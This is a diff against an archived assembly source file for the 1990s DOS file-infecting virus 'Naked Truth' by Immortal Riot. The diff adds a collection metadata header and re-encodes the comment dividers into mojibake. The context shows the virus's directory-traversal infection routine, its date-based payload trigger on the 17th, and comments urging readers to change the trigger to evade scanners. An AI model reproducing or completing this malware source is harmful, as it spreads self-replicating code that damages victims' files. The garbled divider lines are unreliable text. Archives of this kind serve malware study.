@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      N
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 ; VirusName : Naked Truth
 ; Country   : Sweden
 ; Author    : The Unforiven / Immortal Riot
@@ -155,10 +166,10 @@ NoneLeft:	cmp	byte ptr [bp+offset infected],2	;2 infected
 		mov	di,100h				;DI= 100h
 		cmp	word ptr [di],20CDh		;an INT 20h?
 		je	daycheck			;je daycheck      
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 ; Here instead of "JE" to theend here, jump to Daycheck, and if the day
 ; isn't the 17:ten, just continue to theend, but if it is, have phun...
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 	        lea	dx,[bp+offset riot]	;dot-dot method..
 ;	        MOV	DX,OFFSET RIOT		;shitty liner..      
 		mov	ah,3Bh			;Set current directory
@@ -166,7 +177,7 @@ NoneLeft:	cmp	byte ptr [bp+offset infected],2	;2 infected
 		jc	TheEnd			;We're through!
 		mov	ah,4Eh			;check for first com
 		jmp	continue		;Start over in new dir
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 ; If you want to get a redeeming on some special month, just look at the
 ; call to daycheck at "nonleft" and the call to daycheck. Change the call
 ; to monthcheck, and "delete" the ";" on procedure monthcheck. But 
@@ -174,14 +185,14 @@ NoneLeft:	cmp	byte ptr [bp+offset infected],2	;2 infected
 ; all scanners has probably added a new scan-string on this one. Now it will
 ; go off the 17:th every month. Feel free to modify this date as much you
 ; want to.
-; дд-ддд-ддддддддд--ддд--дддддд-ддддд--ддддддд-ддддддд-дддддддд-ддддд-д-дд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫-О©╫О©╫-
 ; monthcheck:		 ; check what month it is..   
 ;  	mov ah,2ah	 ;                         
 ;  	int 21h		 ; dos to your service..
 ;  	cmp dh,10  	 ; check if month 10..      
 ;	je  daycheck	 ; if yes jump to day check
 ; 	jmp theend	 ; otherwise jump to theend.
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 DAYCHECK:		 ; Check what day it is..
   	mov ah,2ah	 ; 
  	int 21h		 ; Dos to your service..
@@ -217,11 +228,11 @@ morefilling:	db	" // DEATH TO ALL - PEACE AT LAST // "
 Copyleft:     	db	' The Unforgiven / Immortal Riot '        
 
 
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 ; None of this information is included in the virus's code.  It is only
 ; used during the search/infect routines and it is not necessary to pre-
 ; serve it in between calls to them.
-; дд-ддд-дддддддд--дддд--дддддд-ддддд--ддддддд-дддддд----дддддд-ддддд-дддд-
+; О©╫О©╫-О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫--О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫О©╫----О©╫О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫О©╫-О©╫О©╫О©╫О©╫-
 
 EOF:						;End Of File..
 DTA:		db	21 dup (?)		;internal search's data
